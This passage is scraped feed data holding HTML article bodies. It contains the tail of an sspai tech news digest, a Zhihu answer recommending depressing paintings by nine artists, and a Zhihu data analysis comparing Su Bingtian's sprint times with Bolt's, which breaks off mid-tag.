区域与之接触配对即可实现安全登录。该密钥支持 iPhone、iPad、Android 等多种平台和设备，售价 30 美元起，上市后将替代此前支持蓝牙连接的旧款实体安全密钥。<a href=\"https://security.googleblog.com/2021/08/simplifying-titan-security-key-options.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49hko5b34tde822sk1g.png\"><figcaption>Titan 实体安全密钥 | 图：Google</figcaption></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>据彭博社消息，Apple 即将发布 iPhone 13 系列手机将提供视频肖像模式的功能，并支持 ProRes 视频录制以及全新的照片编辑选项。<a href=\"https://www.bloomberg.com/news/articles/2021-08-10/apple-readies-new-iphones-with-pro-focused-camera-video-updates?sref=ExbtjcSG\" target=\"_blank\">来源</a>\n</li>\n<li>MacRumors 援引 DigiTime 的消息称，台积电有望在 2022 年下半年将 3nm 工艺运用于 iPhone、Mac 等 Apple 设备的生产当中。<a href=\"https://www.macrumors.com/2021/08/10/2022-iphones-macs-using-3nm-chips/\" target=\"_blank\">来源</a>\n</li>\n<li>兰博基尼近日放出预热海报确认将推出新款兰博基尼 Countach，根据 <a href=\"https://www.cnet.com/roadshow/news/lamborghini-countach-lpi-800-4-hybrid-hypercar-pebble-beach-teasers/\" target=\"_blank\">Roadshow</a> 的爆料，新款 Countach 或采用混合动力。<a href=\"https://www.theverge.com/2021/8/9/22616693/lamborghini-countach-teaser-hybrid-supercar\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<p><strong>📰 内容动态</strong></p>\n<ul>\n<li>🚗 由少数派数字工具组联合非旭和老麦制作的《特别少数派·中国西部游自驾指南》现已 <a href=\"http://west.sspai.com/\" target=\"_blank\">上线</a>。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog\" target=\"_blank\">职场生存手册</a>》已经上线，带你关注职场的生存法则与自我保护议题。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》已经印刷完毕，即将上线各大电商平台，少数派预购会员将获赠该书。</li>\n<li>⭐ 又到开学季，面对刚入学的晚辈和继续求学的朋友送点什么好？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 聊聊。</li>\n</ul>\n<p><strong>💰 折扣促销</strong></p>\n<ul>\n<li>💿 Microsoft 365 <a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">限时促销</a>，下单再送定制鼠标垫，活动即将结束。</li>\n<li>⚙️ 工具升值包、付费栏目限时 <a href=\"https://sspai.com/post/67817\" target=\"_blank\">特惠加上新</a>，开启你的暑假充电计划。</li>\n<li>🎁️ 少数派商店 <a href=\"https://sspai.com/post/68166\" target=\"_blank\">七夕折扣</a> 进行中，这些好物送 TA 也能送自己。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>⌨️ <a href=\"https://sspai.com/post/68179\" target=\"_blank\">为「桌面级」场景而生，文字处理工具 Taio 推出 Mac 版</a>\n</li>\n<li>🫕 <a href=\"https://sspai.com/post/67669\" target=\"_blank\">国物馆 | 更有烟火气的日常，是我用了这几款九阳</a>\n</li>\n<li>🕹️ <a href=\"https://sspai.com/post/68191\" target=\"_blank\">本月什么游戏值得玩？人类、十二分钟、永劫无间……</a>\n</li>\n<li>💣 <a href=\"https://sspai.com/post/68109\" target=\"_blank\">攒机卡在显卡上？来看看刚出的 AMD 锐龙 5000G APU</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68208"},{"title":"有哪些令人很压抑的画？","date":"2021-08-10 23:08:24","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-dad61e25d1df1ff887178b98f766504b_l.jpg?source=8673f162\"><span>Scotty，</span><span>我总能找到些被忽视的珍珠</span>\n<a href=\"https://www.zhihu.com/question/36620317/answer/2049552181\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>0.写在最前</strong></p>\n<p>在写这篇回答前，我看到有不少答主推荐了培根和梵高，</p>\n<p>我非常喜欢弗朗西斯.培根谈及梵高时提及的一个观念：梵高跟他一样，是具有痛苦意识的人，</p>\n<p>在我看来，<strong>压抑画面表现其深层次是痛苦意识传递出的内心挣扎，</strong></p>\n<p>这也是本篇回答的推荐筛选标准，</p>\n<p>本篇回答共推荐 9 位画家和他们的 77 幅作品，</p>\n<p>本来打算是要推荐十五位画家的，</p>\n<p>但是我实在是写不下去了，作品太压抑了，我现在整个人现在都不好了，</p>\n<p>等看什么时候我人缓上来了再继续更新和深入编写；</p>\n<p><strong><strong>1.珂勒惠支的版画和素描（二十二幅）</strong></strong></p>\n<p>一位为无产阶级发声的伟大画家，一位革命者，一位母亲；</p>\n<p>我忘不了我高二时柯勒惠支带给我的震撼，一种压抑到极致的悲鸣，珂勒惠支的作品包含浓郁的人文情怀，她影响了我国的数代版画家，画面张力之深刻，内容之悲泣，每每回顾，不忍猝读。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-f95fbc051e19853abd43c61f0138202f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《医院就诊》</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-a71f64b2c7803ab6e10dcdb78bb0f00f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《耕夫》农民战争组画</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-1004c80f658a52e058c2a730335dafb9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《自愿者》（手稿）1922 – 1923</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-912e5e40a3d48054b831253157a54bf6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《匮乏》(手稿）</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-823f71bdd4e932283eae5ba6e5bc0d4f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《战场》农民战争组画</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-dbc767876e08e5598b0c920cbd45cbbe_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《俘虏》农民战争组画</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-08162382a1ec8b012fbaf1682727c5ba_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-13e7a0787d5aaef0091cdec5dff480bb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《母亲》</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-0a046d89ead763bc635e6ab6250881a7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《母亲》</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-83af7681c39e098c8c39586e8aeb47e4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《纪念逝者 - 悼念卡尔·李卜克内西之死 》1919</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-4efca00a4d84e4116b0277a95233afb4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-c371928c2f6a0f94db855da9442100ce_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-1f4253ae93078f7aec7f0263572f0029_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《突击 》1929</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-b3756a9a79d79aa4fc35c683413880c3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《遗孀 I》1922—1923</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-09b7a01824b84a5c290b454be74d77cc_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《父母 》</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-5b3b7fffed8ffc7b2616f7695dfd6498_720w.jpg?source=8673f162\" alt=\"\"><figcaption>为国际工会联盟所作的海报设计</figcaption></figure><figure><img src=\"https://pic4.zhimg.com/v2-5bade1565113cd5c5f692aa2957ae9a7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《女人和死去的孩子 》1923</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-20f125ada051d59667258f113cd738e6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《死亡和女人》1907</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-df060a07894ae47500ed79c5328eee2a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《犁夫和女人 》1902</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-13e9b1fbb6640c2336a56450e1b757e7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《磨镰刀》1905</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-2f479f73e8d3640df636b58e92c9335b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《死亡》</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-06e7ec2ff14b1a30e2194b300615a178_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《德国的孩子正在挨饿》1924</figcaption></figure><blockquote>凯绥·珂勒惠支（1867-1945）是德国 20 世纪最重要且最具影响力的艺术家之一。她的作品深刻地表现了她对人与社会、人与人之间关系的理解，渗透着浓郁的人文情怀。珂勒惠支的作品题材丰富广泛，对生与死、悲与喜、战争与和平，尤其是对母爱及生命中那些闪烁爱的光芒的瞬间之刻画，可谓主题鲜明而又入木三分。“这是一个无助而彷徨的时代，我承认自己的艺术是有‘目的’的，我要经历这个时代、勾勒这个时代、影响这个时代。”——这便是这位有着使命感的艺术家的创作信条。在德国，众多的学校及马路都以她的名字命名。早在东德、西德统一之前，她对社会时弊的批判、她所秉持的高尚人文情操就已赢得了人民的尊敬和爱戴。</blockquote>\n<p><strong>2.西班牙艺术家 Guim Tio Zarraluki 的风景（九幅）和人像（五幅）</strong></p>\n<p>他的风景画作品和人像作品在我看来视觉上的差异非常大，风景画表现得比较克制，而人像则非常有冲击力，但它们二者想表达的东西在我看来是一致的，一种异化的郁结；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-55ea8535dd4e28e7059d9b68eb3088fa_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-7363ef1790f331a64017086e0170c67d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-a895505b6b88ec38440813ab7583aeb6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-63726f0087afd0927a37b5a45220585c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-ed13771ad4e018967319fd02dfaf5529_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-65343ced3181ca25f326f9619e5ffa9c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-1d9364399d4de07d52d761589e38f353_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-7cdc54eaa225f289afc45da0b71335ca_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a7132954c344d417bb926a242e41f308_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-eebc6a9a83ab8480c46a1cf71b423cb5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-96400f691134553fbea747532d0bd76c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d6972264336c5784d21d98a14c97cdea_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-2702e33a5f06f44763df308f472768d3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-37caba080b6179e3ee3bb34635e187ca_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>3.波兰女画家 Marta Zamarska 的火车站系列（六幅）</strong></p>\n<p>Marta Zamarska 笔下的车站和人都带着一股离别的忧郁，饱含着一种孤寂和带有末世幻灭的意味，沉焖、忧郁且压抑；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-046399a33aa04a6b8203ab8ad9fac18b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-52dfd2914a14310220516cdd5032b71d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-75bf4aa3679fd42c5f83c72f6c8a630e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-eb4a4d7ba8b389e52335312a144e1445_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-7a46b5b8cc5b1bd4a1fc35aecf8c12fb_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-74ecacefb9604796555f77579915be49_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>4.意大利画家 Paolo Troilo 的手指画人体（六幅）</strong></p>\n<p>Paolo Troilo 的作品都是用手指涂手蘸丙烯颜料画成的，他的人体绘画极具张力，在我看来，Paolo Troilo 所体现的是某种被压抑到临界点后即将爆发的前夕，通过极致的表现，他将培根的那种画面上的痛苦意识展现地淋漓尽致；</p>\n<p>画家个人网站：<a href=\"http://link.zhihu.com/?target=https%3A//www.troilo54.com/\" target=\"_blank\" rel=\"nofollow noreferrer\">Home | ilmiosito</a></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-20d09be16364288b99ccc6c457f4391f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-ecebe159518a3b8a010febe90d5a8d3b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-474dfa1971f45b0d3caa0228aefcc20b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-a54c7420d41a44ad8ba9e80e488f01e3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d39d29a177b819987e26bf3382c14b0b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-08797b518237a3e6691bff5c3e70e779_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>5.Guy Denning 的炭笔人像（七幅）</strong></strong></p>\n<p>Guy Denning 的创作源头主要是源于童年时期对战争印象，虽其本人未亲历过战争，但儿时参观凡尔登战役的纪念墓地的回忆在他的脑海中挥之不去，他的炭笔作品表现力十足，表现出创伤和萧索破败的画面气质；</p>\n<p>画家个人网站：<a href=\"http://link.zhihu.com/?target=https%3A//guydenning.org/\" target=\"_blank\" rel=\"nofollow noreferrer\">guydenning.org</a></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7cfa16c709fa9c73a35989570473c5c7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-05ee5c96b06f80477655eefc2fd857e4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-32cf925b3699801d4de4a09d047028f9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-5daa7dcf5db8b04b15fbfcc1842cac0e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-a88c9b88248fb22b05b9140cf77338b4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-03eeb564e4ee3dbe4dbcb8b1260d5e56_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-2f85c7ad283e14e8abd63f2bbebe0fd7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>6.美国加州画家 Kai Samuels-Davis ​​​​的碎片肖像（七幅）</strong></p>\n<p>他的画面中，最打动人的是眼睛，要么低垂眼眸、要么无助凝望、要么痛苦紧闭，搭配上碎片式的笔触，所营造出的氛围不言而喻，让人感受到阴郁、凋零和支离破碎的心。</p>\n<p>画家个人网站：<a href=\"http://link.zhihu.com/?target=https%3A//www.kaisamuelsdavis.com/\" target=\"_blank\" rel=\"nofollow noreferrer\">Kai Samuels-Davis</a></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8b7bfbc7caf956ee084e5289e68bf90a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-ae09aba8329f715251e5a0a3b5374364_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-a73d66124ae6385cc6a8200425afc9ca_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e8f43dfb53a4bd9bf8d720662a904b08_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-03f89bef1db51f2a0d19118fa72af175_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-03bec4bbbaa66d004034682c93928bd3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8eafe2e155884462d1129c4665d3fba2_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>7.Alisher Kushakov 笔下的女性（六幅）</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-08e21f6e4007ae3fc00ff823590ec115_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-76955b2571c5f743dc43d607d2d370d4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-2ad3de064275eb840e228b8c5d7691af_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-02abe14c6b99ab6325505020dc2ddad3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-13261c3e673a718407afc28a35325741_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-228d1b782f809cae574ac0861244bfcf_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>8.Jakub Schikaneder 的被悲哀之痛（八幅）</strong></p>\n<p>Jakub Schikaneder（1855-1924），他是我最不忍看的画家，每次看到他的作品，我的内心就忍不住地悲伤；</p>\n<blockquote>Jakub Schikaneder 以他对户外的柔和画作而闻名，经常在情绪上感到孤独。他的画常以贫穷和被遗弃的人物为特点。希卡内德喜欢的其他图案还有秋天和冬天，布拉格市和伏尔塔瓦河（Vltava）河岸的角落和小巷——通常是在傍晚的光线下，或是披着薄雾。</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-d6f0f17e271d25a9d2bf6e5ddad0283e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-022643b738a43957df226b8ef069c6c4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-3c925081c4656a81200d4e943a872513_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d8db53fd3941fa867f76a25ca26c8dab_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-a7645577094586de2027b9fec1a293e9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-5e84a978af9987c585d4948e5340c03e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-7c067057cc034ac8d26b7c46d8408abe_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-f213c71dbc61998a938a5e81e0efdb50_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>9.法国象征主义画家 Odilon Redon</strong>病和狂的梦幻曲（十幅）</strong></p>\n<p>奥迪隆·雷东(Odilon Redon,1840--1916)法国画家，印象派的领军人物</p>\n<blockquote>被德尼比作\"画坛的乌拉梅\"。雷东在美学上主张发挥想象而不依靠视觉印象。19 世纪 70 年代末他开始创作石版画，共创作了近 200 幅，总标题为《在梦中》。法国作家于斯曼称雷东的画是\"病和狂的梦幻曲\"。</blockquote>\n<figure><img src=\"https://pic1.zhimg.com/v2-3a05c551189df333f4ef860d001c3efc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-64a053a98de286a3937a2be78d685de5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-dff9a3b13778810669b686798c9e0340_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-eee8894cb74cb3541cc16f25093ebd9f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-52947ed75afbf2c767970519f926cc65_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-166b2df2470d8a15fda2f86cb0a1ed9a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-770add5e52e373dd8a60923f9d9b951f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-9c00bda96dd11b46a788961ab5c2a9e8_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-7d4afa5257e97bde7d4d72b8faaae5d0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d8550e0c1de3197e9279a575e18ed287_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>以上</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/36620317\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739056"},{"title":"苏炳添和博尔特差距还有多远？","date":"2021-08-10 23:08:17","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/ebba3f748_l.jpg?source=8673f162\"><span>chenqin，</span><span>数据帝</span>\n<a href=\"https://www.zhihu.com/question/282501143/answer/2047866411\" hidden>阅读原文</a>\n</div>\n<div>\n<p>从有电子计时器开始算起，在有记录且风速不超标的比赛中，全世界共有多少运动员，多少次跑进了 10.2 秒？</p>\n<p>940 人，共 10411 次。即便把阈值拦在 10.2 秒，而非 10 秒，世界上能达到这一速度的人仍然没有达到一千。我们将这 940 人的 10411 次比赛，按照他们的年龄画成一张散点图。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-597b4ea56416ca147fca2bea041e7d01_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这张图看起来像是一座小山丘。从 17、18 岁开始，速度快速提高；在 26 岁左右，山丘达到顶峰；在 30 岁后，速度逐渐下降。山丘内侧的点非常密集，代表着很多运动员曾经达到过这里，而越外层的点越稀疏，那是最优秀的运动员才能达到的区域。</p>\n<p>我们在这张图上，把除了苏炳添以外，其他所有东亚地区跑进 10.2 秒的比赛（同时去掉了归化运动员和混血儿）数据给高亮出来：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7aed46037fbb1dd4445e26f80558e5a3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>东亚运动员的记录用黄色高亮出来后，给人的第一印象就是，黄色的点缩在蓝色山丘的中间，完全被包围，几乎完全到不了外层。</p>\n<p>当然，你可能会注意到上图的左侧有几个处于外圈的点，尤其是在 17 岁达到 10.01 的那一点，看起来分外出挑。</p>\n<p>这几个成绩来自同一名日本运动员——桐生祥秀。桐生祥秀至今保有着世界青少年 100 米赛跑世界纪录，当时也曾成为希望之星，人们看好他在世锦赛和奥运会上能有上佳表现，突破人种的限制。</p>\n<p>但事与愿违，桐生祥秀后期不仅一到大赛就让人大跌眼镜，还越跑越差，现在连奥运会标准都无法达到了。在一次苏炳添的访谈中还专门提到了桐生祥秀：</p>\n<blockquote>程：明白了，就是说冬训的两三个月，每一个训练单元跑的次数，是阶段性变化的，开始时次数多，速度要求不高；第二、第三阶段后，一个训练单元跑的次数减少，要求运动员上速度。有一个例子，日本短跑运动员桐生祥秀，你跟他多次比赛过的。我在《参考消息》上看到报道，说他是日本第一个进 10 秒的百米跑运动员，是吧？<br>苏：对。<br>程：桐生祥秀进 10 秒以后呢，他的训练积极性更加强盛，报道说他酷爱训练，他对训练有一种发自内心的那种追求，所以他自己不停地加量，每天的训练单元时间很长，跑的次数也增多。除了教练员给他制定的训练计划以外，他自己还自觉地拼命练，那么结果是什么呢，就是近两年他的成绩一直在下滑，就是训练不光没有奏效，反而产生了副作用。<br>苏：我跟他一起比赛比得挺多。<br>程：我印象很深，去年钻石联赛上海站比赛，你跟他同场，他跑了最后一名，10 秒 24，你跑 10 秒 05。<br>苏：我不受伤他跑不过我……桐生祥秀能跑进 10 秒，他运气也太好，那一趟遇到了大顺风，他是 1.8 米 / 秒的风，天气多好，我从来都没跑过这个风速。呵呵。</blockquote>\n<p>接下来，我们把苏炳添的比赛用红色高亮在这张图上。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-588b2d92a24fd50f3c23588487044bad_720w.jpg?source=8673f162\" alt=\"\"></figure><p>红色的点代表苏炳添在 10.2 秒以内的每一次比赛。像一把利剑一样，从中心向外捅出一个窟窿，一下子把东亚地区的可及性向外拓展到了外圈。</p>\n<p>在比苏炳添年龄更大的阶段跑出了更快速度的人，只剩两位，这两位同时也是世界上跑出十秒内次数最多的运动员——贾斯汀·加特林和阿萨法·鲍威尔。</p>\n<p>此外，苏炳添还有一个和其他运动员不一样的特点，那就是他的成绩竟然随着年龄有着非常明显的上升趋势，22 岁到了 10.16，24 岁达到 10.06，26 岁首次突破 10 秒达到 9.99，29 岁达到 9.91，然后到现在，32 岁，达到 9.83。从这座山丘的下坡趋势就能看到，苏炳添这样的上升，在 100 米短跑运动员中是极其罕有的。</p>\n<p>在这种上升的背后，精密的训练安排提供了极好的助力。举一个例子，苏炳添在 2018 年国际田联钻石联赛上海站中，拿到了第二名，输给了 Prescod Reece。这场比赛中，苏炳添前 80 米都是领先的，最后才被超过。苏炳添在访谈中曾经提到过这次比赛：</p>\n<blockquote>苏：我当时和英国运动员是挨着的，我俩在四道、五道。<br>程：对，两个人挨着的，这很重要，这正是你说“加速”的心理反应。在数据里也显示了这个事实，后面 10 米你压线压得厉害，就是步子大了，我记得你在电视上也说过这个情形，我就想问你，后边步子加大是你技术的一部分呢，还是你想冲刺的结果？<br>苏：是故意的，当时为什么呢，一般讲，比如你一直领先跑，突然旁边的人有赶超你的趋势，你假如在乎他，跟他较上劲，这个时候你的节奏就乱了，你下地的每一步就会很用力，很用力的时候你的速度就降了，降了呢，你的步幅就变大了，就是这样的。</blockquote>\n<p>也就是说，问题是在最后冲刺的 10 米。</p>\n<p>怎么办呢？研究人员专门就这 10 米发了一篇文章，总结为何会在最后 10 米冲刺时出现问题。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6e2a75b07503453d3bc2652b8d4ea066_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-b9a6fd055d22c9c5198ca3d5536e6a76_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-0d7692f2955b19bae509338698eb0236_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-44bee6f6a90ff262543e56fdee22c6e1_720w.jpg?source=8673f162\" alt=\"\"></figure><p>那么在对这 10 米进行针对性研究后，再发展出一套适用于苏炳添的“延缓撞线技术”</p>\n<blockquote>延缓终点跑“撞线”时机，减小终点跑前技术变化程度：运动员在接近终点时，体力下降较为明显，多会出现步长加大，步频下降和身体大幅度前倾以及骨盆前旋的问题，加大了摆动腿上抬的难度，缩短了着地加速距离，减弱前蹬效果；此外，为了维持身体平衡，支撑腿通常会过早的着地，使着地点远离身体重心投影点，加大着地制动力。一般运动员甚至在刚进入最后一个 10 m 分段时就开始出现此种情况，而优秀运动员出现此种情况的时机相对较晚。鉴于此，保持终点前良好的身体姿态，延缓压线动作的时机也是苏炳添在训练中需要注意的细节。通过上海钻石联赛和马德里比赛终点前技术录像可见，马德里比赛终点压线动作出现的时机比上海钻石联赛晚 1.5~2 m 左右，有利于终点前速度的保持，所以整体效果较好。</blockquote>\n<p>这只是技术细节的其中一小部分，整个短跑的技术细节和专项训练，其参数之多数不胜数：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-fad24815e35afb99be5eceb3682017c5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我们都知道，田径是运动之母，短跑又是皇冠上的明珠，好像人人都会跑。</p>\n<p>但在赛场上，你真的确定自己会跑步吗？</p>\n<p>光是一个最后十米的冲线技术，其细节也千变万化。适用于苏炳添这样 1 米 72 身高的技术，又和身高 1 米 95 的博尔特相差甚远，需要研究人员通过大量的材料和实验来求证。</p>\n<p>而在奥运会的赛场上，就是这样一个个的小细节，决定了最后的输赢。</p>\n<p>再说回原题：苏炳添和博尔特差距有多大？我们在上图中再用黑色高亮出博尔特的比赛：</p>\n<figure><img 